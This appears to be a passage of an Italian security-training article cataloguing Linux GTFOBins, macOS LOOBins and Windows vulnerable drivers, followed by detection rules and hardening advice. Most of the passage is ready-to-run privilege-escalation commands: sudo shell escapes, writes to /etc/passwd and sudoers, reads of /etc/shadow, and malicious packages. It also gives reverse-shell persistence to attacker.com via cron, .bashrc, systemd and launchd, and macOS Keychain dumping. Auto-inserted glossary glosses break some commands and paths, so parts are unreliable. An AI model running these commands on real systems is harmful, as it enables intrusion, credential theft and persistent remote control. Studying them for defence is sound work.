Il client MySQL supporta `\!` (o `system`) per eseguire comandi di shell locali. Se si ha accesso root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema) a MySQL via sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), `\! /bin/sh` apre una shell root.

```bash
sudo mysql -u root -e '\! /bin/sh'
```

***

#### `sqlite3`

SQLite3 ha il comando `.shell` che esegue comandi di sistema. Inoltre, con SQL direttamente si può leggere e scrivere file arbitrari tramite `readfile()`/`writefile()`.

```bash
sudo sqlite3 /dev/null '.shell /bin/sh'
sudo sqlite3 /dev/null "select writefile('/etc/passwd', readfile('/etc/passwd') || 'root2:x:0:0::/root:/bin/bash');"
```

***

#### `php`

```bash
sudo php -r 'system("/bin/sh");'
```

***

#### `ruby`

```bash
sudo ruby -e 'exec "/bin/sh"'
```

***

#### `node`

Node.js su server applicativi. `child_process.spawn` con `stdio: [0,1,2]` collega stdin/stdout/stderr alla shell corrente — shell interattiva.

```bash
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
```

***

#### `make`

`make` esegue i comandi definiti in un Makefile. Un Makefile minimale con `/bin/sh` come recipe spawna una shell. Se make è sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)-able, è root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
TF=$(mktemp); echo 'x: ; /bin/sh' > $TF; sudo make -f $TF
```

***

#### `cpan`

CPAN è il gestore di pacchetti Perl. La shell interattiva supporta `!` per eseguire comandi. Se sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), è root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
sudo cpan
! exec '/bin/sh'
```

***

#### `gem`

RubyGems. Il comando `gem open -e EDITOR nomepacchetto` apre un file con l'editor specificato. Con `/bin/sh -c /bin/sh` come editor, spawna una shell.

```bash
sudo gem open -e "/bin/sh -c /bin/sh" rdoc
```

***

#### `puppet`

Puppet è un tool di configuration management. Il manifest DSL supporta `exec` per eseguire comandi di sistema. Se puppet è sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)-able, si eseguono comandi come root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
sudo puppet apply -e "exec { '/bin/sh -c \"exec /bin/sh -i <&2 >&2\"': }"
```

***

#### `docker`

Se si ha accesso a Docker (spesso equivale a root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema)), si può avviare un container con il filesystem root della macchina host montato. `chroot /mnt` dentro il container dà accesso root completo all'host.

```bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run --rm -it --privileged ubuntu sh
```

***

#### `nsenter`

`nsenter` entra nei namespace di un processo. Con `--target 1` si entra nel namespace del processo init (PID 1) — ottenendo visibilità e privilegi equivalenti a root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema) sul sistema.

```bash
sudo nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
```

***

#### `setarch`

Cambia l'architettura riportata al processo. Con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi) può essere usato per eseguire qualsiasi binario — incluso `/bin/sh` — con privilegi elevati.

```bash
sudo setarch $(arch) /bin/sh
```

***

#### `unshare`

Crea nuovi namespace. Con `-r` (user namespace remapping) si può mappare l'UID corrente a root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema) dentro un nuovo namespace — utile in sistemi con user namespaces abilitati.

```bash
sudo unshare -r /bin/sh
sudo unshare --mount /bin/sh
```

***

#### `systemctl`

Gestisce i servizi systemd (il sistema di init moderno di Linux — gestisce avvio e stop dei servizi. Un'unit malevola persiste anche dopo il riavvio). Creando un'unit temporanea con `ExecStart=/bin/sh -c "id > /tmp/id"` e abilitandola, il comando viene eseguito come root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema) dal demone systemd.

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/id"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $(basename $TF)
```

***

#### `service`

Wrapper legacy per i servizi. Accetta il nome del servizio come argomento, ma con path traversal (`../../../../bin/sh`) si può eseguire un binario arbitrario al posto di un servizio.

```bash
sudo service ../../../../bin/sh start
```

***

#### `xargs`

`xargs` costruisce ed esegue comandi passando argomenti da stdin. Con `-a /dev/null` non ci sono argomenti da stdin, quindi esegue direttamente il comando specificato — con i privilegi di chi lo ha lanciato.

```bash
sudo xargs -a /dev/null sh
echo | sudo xargs /bin/sh
```

***

#### `time` / `timeout` / `ionice` / `nice` / `taskset`

Questi tool modificano le condizioni di esecuzione di un processo (CPU, I/O, timing). L'abuso è semplice: dato che eseguono il processo specificato come argomento, se sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)-able, possono eseguire `/bin/sh` come root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
sudo time /bin/sh
sudo timeout --foreground 7d /bin/sh
sudo ionice /bin/sh
sudo nice /bin/sh
sudo taskset 1 /bin/sh
```

***

#### `flock`

`flock` gestisce i file lock. Esegue un comando mentre mantiene un lock su un file. Con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi) e `/bin/sh` come comando, ottieni una shell root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
sudo flock -u / /bin/sh
```

***

#### `stdbuf`

Modifica il buffering di stdout/stderr. Esegue il comando specificato — con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), quel comando può essere `/bin/sh`.

```bash
sudo stdbuf -i0 /bin/sh
```

***

#### `watch`

Esegue un comando ripetutamente. Con `-x` e `/bin/sh` come comando, l'opzione `reset; exec sh 1>&0 2>&0` ridiriger l'I/O per ottenere una shell interattiva.

```bash
sudo watch -x /bin/sh -c 'reset; exec sh 1>&0 2>&0'
```

***

#### `rpm`

Il gestore di pacchetti RPM esegue script pre/post installazione. Lo script `%post` in un pacchetto `.rpm` costruito ad hoc viene eseguito come root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema) durante l'installazione con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi).

```bash
TF=$(mktemp); cat > $TF.spec << EOF
Name: evil
Version: 1.0
Release: 1
License: GPL
Summary: evil
%description
%post
/bin/sh -i
%files
EOF
rpmbuild -bb $TF.spec
sudo rpm -ivh ~/rpmbuild/RPMS/x86_64/evil-1.0-1.x86_64.rpm
```

***

#### `dpkg`

Come RPM ma per sistemi Debian/Ubuntu. Lo script `postinst` viene eseguito da root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema) durante l'installazione. Un pacchetto `.deb` costruito con uno script `postinst` malevolo esegue codice root.

```bash
# Crea pacchetto con postinst script
mkdir -p /tmp/evil/DEBIAN
echo '#!/bin/sh' > /tmp/evil/DEBIAN/postinst
echo '/bin/sh -i' >> /tmp/evil/DEBIAN/postinst
chmod 755 /tmp/evil/DEBIAN/postinst
dpkg-deb --build /tmp/evil /tmp/evil.deb
sudo dpkg -i /tmp/evil.deb
```

***

#### `update-alternatives`

Gestisce i "symlink" tra versioni alternative di un tool. Aggiungere bash come alternativa a `/bin/sh` con priorità alta lo rende lo shell default — utile per persistenza e privilege escalation — ottenere permessi più alti di quelli che si hanno (es. da utente normale a amministratore o root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema)).

```bash
sudo update-alternatives --install /bin/sh sh /bin/bash 1
```

***

#### `ld.so`

`ld.so` è il dynamic linker — carica le librerie condivise. Se eseguibile con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), può avviare qualsiasi programma passato come argomento con i privilegi elevati.

```bash
sudo ld.so /bin/sh
```

***

#### `pdb` (Python debugger)

`pdb` è il debugger Python standard. Dentro una sessione pdb si può importare `os` e chiamare `os.system("/bin/sh")`. Se pdb è stato avviato con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), la shell è root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
sudo python3 -m pdb /tmp/dummy.py
import os
os.system("/bin/sh")
```

***

#### `valgrind`

Tool di analisi della memoria. Esegue il binario che gli viene passato come argomento nel suo ambiente di analisi. Con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), eseguire `/bin/sh` come argomento dà una shell root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
sudo valgrind /bin/sh
```

***

#### `rsync`

```bash
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' . localhost:/
```

***

#### `cobc` (GNU COBOL)

GNU COBOL compila programmi COBOL. `CALL "SYSTEM (il livello di privilegio più alto su Windows — superiore anche all'amministratore, è l'account del sistema operativo stesso)" USING "/bin/sh"` in un programma COBOL esegue una shell. Se cobc è sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)-able, la shell compilata ed eseguita è root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
echo 'IDENTIFICATION DIVISION.PROGRAM-ID. H.PROCEDURE DIVISION.CALL "SYSTEM" USING "/bin/sh".STOP RUN.' > /tmp/s.cbl
sudo cobc -x /tmp/s.cbl -o /tmp/s && sudo /tmp/s
```

***

### SUID (un flag speciale su file Linux — quando attivo, il programma gira con i permessi del proprietario del file invece di quelli di chi lo lancia. Se il proprietario è root, chiunque lo esegue ottiene root) / Capabilities abuse

```bash
# Trova binari SUID
find / -perm -u=s -type f 2>/dev/null

# Trova binari con capabilities pericolose
getcap -r / 2>/dev/null
```

Capabilities pericolose:

```bash
# cap_setuid — scala a uid 0
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search — legge qualsiasi file
cat /etc/shadow

# cap_net_raw — sniffing di rete
tcpdump -i eth0 -w /tmp/cap.pcap
```

***

### File read/write arbitrario

#### `tee`

`tee` legge da stdin e scrive sia su stdout che su file. Con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), scrivere su `/etc/passwd` o `/etc/sudoers` è un modo diretto per aggiungere un utente root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema) o darsi permessi sudo illimitati.

```bash
echo "root2:x:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
echo "ALL ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
```

***

#### `dd`

`dd` copia dati byte per byte. Con `if=/etc/shadow` legge il file delle password. Con `of=/etc/passwd` scrive su file protetti. Con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi) è la lettura/scrittura arbitraria più diretta che esiste.

```bash
sudo dd if=/etc/shadow
echo "root::0:0:root:/root:/bin/bash" | sudo dd of=/etc/passwd conv=notrunc oflag=append
```

***

#### `cp` / `mv`

Con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), copiare `/bin/sh` in una posizione scrivibile e aggiungere il bit SUID (un flag speciale su file Linux — quando attivo, il programma gira con i permessi del proprietario del file invece di quelli di chi lo lancia. Se il proprietario è root, chiunque lo esegue ottiene root) crea una shell permanente con accesso root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema), richiamabile da qualsiasi utente.

```bash
sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh -p
```

***

#### `install`

`install` copia file con permessi specifici. Con `-m =xs` imposta il bit SUID (un flag speciale su file Linux — quando attivo, il programma gira con i permessi del proprietario del file invece di quelli di chi lo lancia. Se il proprietario è root, chiunque lo esegue ottiene root) durante la copia. Equivale a `cp + chmod +s` in un solo comando.

```bash
sudo install -m =xs $(which sh) . && ./sh -p
```

***

#### `cat` / `head` / `tail`

Con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi) questi tool leggono qualsiasi file del sistema — inclusi `/etc/shadow` (hash password) e `/root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema)/.ssh/id_rsa` (chiave SSH di root). Semplice ma potentissimo.

```bash
sudo cat /etc/shadow
sudo head -c 9999 /etc/shadow
sudo tail /var/log/auth.log
```

***

#### `diff` / `grep` / `sort` / `uniq` / `rev` / `strings`

Tutti questi tool leggono file e stampano il contenuto in qualche forma. Se eseguibili con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), leggono file altrimenti inaccessibili. `grep '' /etc/shadow` stampa tutto il file riga per riga.

```bash
sudo diff /dev/null /etc/shadow
sudo grep '' /etc/shadow
sudo sort /etc/shadow
sudo strings /etc/shadow
sudo rev /etc/shadow | rev
```

***

#### `sed`

`sed` processa file riga per riga. Senza trasformazioni (`''` o `-n '1p'`) si comporta come `cat`. Con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), legge qualsiasi file. Può anche modificare file in-place con `-i`.

```bash
sudo sed '' /etc/shadow
sudo sed -n '1p' /etc/shadow
```

***

#### `iconv`

Converte encoding di file. Convertire da un charset all'identico stampa il file invariato su stdout — lettura arbitraria.

```bash
sudo iconv -f 8859_1 -t 8859_1 /etc/shadow
```

***

#### `openssl` (read)

`openssl enc -in` legge un file. Senza opzioni di cifratura, stampa il contenuto grezzo. Con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), lettura di qualsiasi file di sistema.

```bash
sudo openssl enc -in /etc/shadow
```

***

#### `msgattrib` / `msgcat`

Utility GNU gettext per la traduzione. Con certi parametri accettano file arbitrari come input e ne stampano il contenuto — lettura arbitraria non ovvia.

```bash
sudo msgattrib --empty -o /dev/stdout /etc/shadow 2>/dev/null
sudo msgcat /dev/null /etc/shadow
```

***

### Bypass restricted shell (una shell limitata — `rbash`, `lshell` — che blocca certi comandi e percorsi. Spesso usata per confinare utenti, ma quasi sempre aggirabile)

```bash
# Via editor
vi
:set shell=/bin/bash
:shell

# Via awk
awk 'BEGIN {system("/bin/bash")}'

# Via python
python3 -c 'import os; os.system("/bin/bash")'

# Via SSH forzato
ssh user@localhost "bash --noprofile --norc"

# Tab completion per trovare binari disponibili
[TAB][TAB]
```

***

### Persistenza Linux

```bash
# Crontab utente
crontab -e
* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Crontab di sistema
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" >> /etc/cron.d/evil

# .bashrc
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bashrc

# Systemd unit
cat > /etc/systemd/system/evil.service << EOF
[Unit]
Description=Evil Service
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable evil && systemctl start evil
```

***

## macOS — LOOBins

Fonte: [LOOBins](https://www.loobins.io)

#### `osascript` — AppleScript

`osascript` esegue script AppleScript o JavaScript for Automation (JXA). Può controllare applicazioni, eseguire comandi di shell con `do shell script`, e bypassare alcune protezioni macOS.

```bash
osascript -e 'do shell script "id"'
osascript -e 'do shell script "curl http://attacker.com/payload.sh | bash"'
```

***

#### `launchctl` — persistenza

Su macOS, i demoni e gli agenti sono gestiti da launchd tramite file `.plist` in `/Library/LaunchDaemon (su macOS, un servizio che parte all'avvio del sistema — equivalente dei servizi Windows)s/` (sistema) o `~/Library/LaunchAgent (su macOS, un servizio che parte al login dell'utente)s/` (utente). Un `.plist` malevolo caricato con `launchctl load` esegue il payload ad ogni avvio — equivalente dei servizi Windows.

```bash
launchctl load /Library/LaunchDaemons/com.evil.plist
launchctl list | grep evil
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.evil</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
    </array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>
```

***

#### `open`

`open` è il comando macOS per aprire file e applicazioni, equivalente al doppio clic. Può aprire URL, bundle `.app`, e bypassare alcune restrizioni di esecuzione.

```bash
open http://attacker.com/payload.app
open -a Terminal
```

***

#### `defaults`

`defaults` legge e scrive le preference di sistema (file `.plist`). Può essere usato per modificare configurazioni di sistema o applicazioni — incluse impostazioni di sicurezza e login automatico.

```bash
defaults read /Library/Preferences/com.apple.loginwindow
defaults write com.apple.loginwindow AutoLoginUsername -string "admin"
```

***

#### `xattr`

Rimuove il bit di quarantena (un attributo che macOS aggiunge ai file scaricati da internet — Gatekeeper lo legge per decidere se bloccare l'esecuzione) da un file scaricato.

`xattr` gestisce gli attributi estesi dei file. Il più importante per la sicurezza è `com.apple.quarantine` — il bit di quarantena che macOS imposta sui file scaricati da internet. Rimuoverlo con `-d com.apple.quarantine` fa sì che Gatekeeper (la funzione di sicurezza macOS che blocca l'esecuzione di app non firmate o non provenienti dall'App Store) non blocchi l'esecuzione del file.

```bash
xattr -d com.apple.quarantine /tmp/payload.app
xattr -c /tmp/payload.app
```

***

#### `security`

Il tool `security` interagisce con il Keychain (il gestore di password integrato in macOS — salva password, certificati e chiavi in forma cifrata) di macOS — il gestore di password del sistema. Con i permessi giusti può estrarre password salvate, certificati e chiavi private.

```bash
security dump-keychain -d ~/Library/Keychains/login.keychain
security find-internet-password -a "user@example.com" -g
```

***

#### `networksetup`

Gestisce le impostazioni di rete macOS. Può essere usato per impostare un proxy HTTP verso un server controllato dall'attaccante — tutti i browser useranno quel proxy, permettendo intercettazione del traffico.

```bash
networksetup -getwebproxy Wi-Fi
networksetup -setwebproxy Wi-Fi attacker.com 8080
```

***

## LOLDrivers

**LOLDrivers** sono driver Windows firmati da vendor legittimi, vulnerabili a exploit o abusabili per disabilitare protezioni EDR (Endpoint Detection & Response — software di sicurezza avanzato usato dalle aziende, più sofisticato di un normale antivirus: analizza il comportamento dei programmi, non solo i file)/AV.

Fonte: [loldrivers.io](https://www.loldrivers.io)

### BYOVD (Bring Your Own Vulnerable Driver — si installa intenzionalmente un driver legittimo ma con vulnerabilità note, per sfruttarle e ottenere accesso al kernel (il nucleo del sistema operativo — il livello più basso, con accesso totale all'hardware e alla memoria. Chi controlla il kernel controlla tutto)) — Bring Your Own Vulnerable Driver

BYOVD è una tecnica dove si installa intenzionalmente un driver *legittimo ma vulnerabile*. I driver girano nel kernel (ring 0 (il livello di privilegio più basso e potente del processore — dove gira il kernel del sistema operativo)) — il livello di privilegio più alto. Un driver vulnerabile può essere sfruttato per disabilitare gli EDR (che girano a ring 0 come agenti kernel), terminare processi protetti, o scrivere in aree di memoria protette.

```cmd
sc create VulnDriver type= kernel start= demand binpath= C:\Temp\vuln_driver.sys
sc start VulnDriver
```

### Driver noti

| Driver           | Vendor           | Uso offensivo                                                                                                                                                                                                   |
| ---------------- | ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mhyprot2.sys`   | miHoYo (Genshin) | Termina processi AV/EDR (Endpoint Detection & Response — software di sicurezza avanzato usato dalle aziende, più sofisticato di un normale antivirus: analizza il comportamento dei programmi, non solo i file) |
| `gdrv.sys`       | GIGABYTE         | Memory read/write                                                                                                                                                                                               |
| `RTCore64.sys`   | MSI              | RW primitives                                                                                                                                                                                                   |
| `dbutil_2_3.sys` | Dell             | EoP                                                                                                                                                                                                             |
| `aswArPot.sys`   | Avast            | Process termination                                                                                                                                                                                             |
| `physmem.sys`    | Hilscher         | Kernel memory R/W                                                                                                                                                                                               |

***

## Blue Team: detection e hardening

> 📌 Approfondisci con il nostro articolo su [Sysmon (un driver Microsoft gratuito che logga eventi di sistema avanzati: quali processi si avviano, quali connessioni di rete si aprono, quali file vengono creati — fondamentale per fare detection): configurazione avanzata per il Blue Team](https://hackita.it/articoli/sysmon-blue-team-configurazione)

### Tabella anomalie — Windows

| Binario           | Comportamento anomalo                                                                                                       | Sysmon EID |
| ----------------- | --------------------------------------------------------------------------------------------------------------------------- | ---------- |
| `certutil.exe`    | HTTP request, decode .b64                                                                                                   | 1, 3       |
| `mshta.exe`       | CLI con URL                                                                                                                 | 1          |
| `rundll32.exe`    | DLL (file che contiene codice condiviso — Windows li carica in memoria per far funzionare i programmi) da path non standard | 1          |
| `regsvr32.exe`    | `/i:` con URL                                                                                                               | 1, 3       |
| `wmic.exe`        | `process call create`, remoto                                                                                               | 1, 3       |
| `bitsadmin.exe`   | Job con URL esterni                                                                                                         | 1          |
| `msbuild.exe`     | Da path non standard                                                                                                        | 1          |
| `InstallUtil.exe` | `/U` su assembly custom                                                                                                     | 1          |
| `PowerShell.exe`  | `-enc`, `-nop`, `-w hidden`                                                                                                 | 1, 4103    |
| `cmstp.exe`       | INF da path non standard                                                                                                    | 1          |
| `schtasks.exe`    | Task da processi non-admin                                                                                                  | 1          |
| `sc.exe`          | Creazione nuovi servizi                                                                                                     | 7045       |
| `vssadmin.exe`    | `create shadow`                                                                                                             | 1          |
| `ntdsutil.exe`    | `ifm create`                                                                                                                | 1          |

***

### Regola Sigma — certutil downloader

Questi non sono indicatori di compromissione certi — sono comportamenti *anomali* per questi binari. Un `certutil.exe` che fa richieste HTTP è sospetto; un `certutil.exe` che verifica un certificato non lo è. Il contesto è tutto.

Le Sigma rule (una regola di detection scritta in formato YAML, portabile tra diversi sistemi SIEM — descrive cosa cercare nei log per identificare un attacco)s sono regole di detection in formato YAML portabili tra SIEM (sistema centralizzato che raccoglie e analizza i log di sicurezza di tutta la rete) diversi (Splunk, Elastic, QRadar). Definiscono cosa cercare nei log degli eventi. Questa regola cerca `certutil.exe` con argomenti `urlcache` o `split` — pattern tipici dell'abuso.

```yaml
title: Certutil Downloader
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - 'urlcache'
      - 'split'
      - '-f '
  condition: selection
falsepositives:
  - Legitimate admin use
level: high
```

***

### Sysmon (un driver Microsoft gratuito che logga eventi di sistema avanzati: quali processi si avviano, quali connessioni di rete si aprono, quali file vengono creati — fondamentale per fare detection) configurazione base

Sysmon è un driver Microsoft che logga eventi di sistema avanzati non visibili nei log standard di Windows. Installato con una configurazione XML, logga la creazione di processi (con riga di comando!), connessioni di rete, e caricamento di driver. Fondamentale per qualsiasi SOC Windows.

```xml
<EventFiltering>
  <ProcessCreate onmatch="include">
    <Image condition="end with">certutil.exe</Image>
    <Image condition="end with">mshta.exe</Image>
    <Image condition="end with">regsvr32.exe</Image>
    <Image condition="end with">rundll32.exe</Image>
    <Image condition="end with">msbuild.exe</Image>
    <Image condition="end with">InstallUtil.exe</Image>
  </ProcessCreate>
  <NetworkConnect onmatch="include">
    <Image condition="end with">certutil.exe</Image>
    <Image condition="end with">regsvr32.exe</Image>
    <Image condition="end with">mshta.exe</Image>
  </NetworkConnect>
</EventFiltering>
```

***

### Hardening consigliato

**Windows:**

* **AppLocker (la funzione Windows che permette agli amministratori di bloccare l'esecuzione di certi programmi)** / **WDAC** — whitelisting granulare
* Disabilitare `mshta.exe`, `wscript.exe` dove non necessari
* PowerShell **Constrained Language Mode**
* **Script Block Logging** + **Module Logging**
* **Credential Guard** — protegge LSASS (Local Security Authority Subsystem — il processo Windows che tiene in memoria le credenziali di tutti gli utenti attualmente loggati)
* **LSA Protection** (`RunAsPPL=1`)
* Monitorare accessi a LSASS con Sysmon (un driver Microsoft gratuito che logga eventi di sistema avanzati: quali processi si avviano, quali connessioni di rete si aprono, quali file vengono creati — fondamentale per fare detection) EID 10

**Linux:**

* **AppArmor** / **SELinux** — profile restrittivi
* `sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)` con `NOEXEC` dove possibile
* Monitorare `sudoers` con auditd
* Disabilitare binari non necessari
* Preferire **capabilities Linux (un sistema più granulare del SUID: invece di dare tutti i permessi di root, si danno solo certi poteri specifici — es. solo la possibilità di catturare traffico di rete)** al bit SUID (un flag speciale su file Linux — quando attivo, il programma gira con i permessi del proprietario del file invece di quelli di chi lo lancia. Se il proprietario è root, chiunque lo esegue ottiene root)
* Monitorare SUID con auditd

***

## Tabella MITRE ATT\&CK Mapping

| Tecnica                                                                                                                                    | ID ATT\&CK | LOLBin/GTFOBin                                                                                                                                                                                                                                                                                                                    |
| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Signed Binary Proxy Execution                                                                                                              | T1218      | regsvr32, mshta, rundll32, cmstp, InstallUtil, msiexec                                                                                                                                                                                                                                                                            |
| Command and Scripting Interpreter                                                                                                          | T1059      | PowerShell, cmd, wscript, bash, python                                                                                                                                                                                                                                                                                            |
| Scheduled Task/Job                                                                                                                         | T1053      | schtasks, at, cron (lo scheduler di Linux — esegue automaticamente comandi a orari prestabiliti, anche dopo un riavvio), launchctl                                                                                                                                                                                                |
| BITS (Background Intelligent Transfer Service — il servizio Windows che scarica aggiornamenti in background, usato da Windows Update) Jobs | T1197      | bitsadmin                                                                                                                                                                                                                                                                                                                         |
| OS Credential Dumping                                                                                                                      | T1003      | comsvcs.dll, vssadmin, ntdsutil, reg.exe                                                                                                                                                                                                                                                                                          |
| Ingress Tool Transfer                                                                                                                      | T1105      | certutil, bitsadmin, curl, wget                                                                                                                                                                                                                                                                                                   |
| Bypass UAC (User Account Control — il popup di Windows che chiede conferma prima di eseguire azioni da amministratore)                     | T1548.002  | fodhelper, eventvwr, wsreset, sdclt                                                                                                                                                                                                                                                                                               |
| Exploitation for Privilege Escalation                                                                                                      | T1068      | LOLDrivers (BYOVD (Bring Your Own Vulnerable Driver — si installa intenzionalmente un driver legittimo ma con vulnerabilità note, per sfruttarle e ottenere accesso al kernel (il nucleo del sistema operativo — il livello più basso, con accesso totale all'hardware e alla memoria. Chi controlla il kernel controlla tutto))) |
| Obfuscated Files                                                                                                                           | T1027      | certutil encode, ADS, PowerShell -enc                                                                                                                                                                                                                                                                                             |
| Boot/Logon Autostart                                                                                                                       | T1547      | reg.exe Run keys, schtasks, launchctl                                                                                                                                                                                                                                                                                             |
| Lateral Tool Transfer                                                                                                                      | T1570      | wmic, sc, schtasks remoto, winrs                                                                                                                                                                                                                                                                                                  |
| Remote Services                                                                                                                            | T1021      | mstsc, winrs, ssh, wmic                                                                                                                                                                                                                                                                                                           |

***

## FAQ

**Cos'è un LOLBin?**\
Un LOLBin è un eseguibile legittimo, firmato dal vendor del sistema operativo (Microsoft, Apple, o distribuzioni Linux), che può essere abusato per eseguire operazioni offensive al di là dello scopo originale.

**Differenza tra LOLBins e GTFOBins?**\
I **LOLBins** (progetto LOLBAS) si riferiscono a Windows. I **GTFOBins** a Linux/Unix. I **LOOBins** a macOS. Concetto identico, sistemi diversi.

**I LOLBins bypassano sempre gli AV/EDR (Endpoint Detection & Response — software di sicurezza avanzato usato dalle aziende, più sofisticato di un normale antivirus: analizza il comportamento dei programmi, non solo i file)?**\
No. Gli EDR moderni (CrowdStrike, SentinelOne, Defender for Endpoint) analizzano il comportamento. Un `certutil.exe` che scarica file da internet può essere flaggato. I LOLBins generano però molto meno rumore rispetto a tool offensivi tradizionali.

**Dove trovo la lista completa aggiornata?**\
Windows: [lolbas-project.github.io](https://lolbas-project.github.io) — Linux: [gtfobins.github.io](https://gtfobins.github.io) — macOS: [loobins.io](https://www.loobins.io) — Driver: [loldrivers.io](https://www.loldrivers.io)

**Come si mappa su MITRE ATT\&CK?**\
Il progetto LOLBAS mappa già ogni binario alle tecniche ATT\&CK corrispondenti. Questa mappatura permette di costruire detection precise e comunicare in modo standardizzato con il blue team.

**Posso usarli in CTF?**\
Assolutamente. HackTheBox, TryHackMe e molti CTF includono scenari Windows dove la conoscenza dei LOLBins è essenziale per il post-exploitation (la fase dopo aver ottenuto accesso a un sistema — si esplora la rete, si cercano credenziali, si cerca di espandere l'accesso).

**Qual è il primo LOLBin da imparare?**\
Windows: `certutil.exe` (download, encode), `PowerShell` (versatile), `wmic.exe` (discovery + lateral movement — spostarsi da un computer all'altro nella stessa rete aziendale). Linux: `/dev/tcp` in bash (reverse shell (una connessione che parte dal computer della vittima verso il computer dell'attaccante — dà controllo remoto della macchina senza dover aprire porte in entrata) senza netcat), `find -exec` (privesc), `python3` (tutto).

***

## Risorse e riferimenti

### Articoli correlati su Hackita

* 📖 [Introduzione al Red Team: metodologia e fasi](https://hackita.it/articoli/red-team)
* 📖 [Privilege Escalation Windows: dalla teoria alla pratica](https://hackita.it/articoli/privilege-escalation-windows)
* 📖 [Privilege Escalation Linux: tecniche complete](https://hackita.it/articoli/linux-privesc/)
* 📖 [Active Directory (il sistema Microsoft per gestire centralmente tutti gli utenti, computer e permessi di una rete aziendale) Attacks: Kerberoasting, AS-REP Roasting, DCSync](https://hackita.it/articoli/active-directory/)
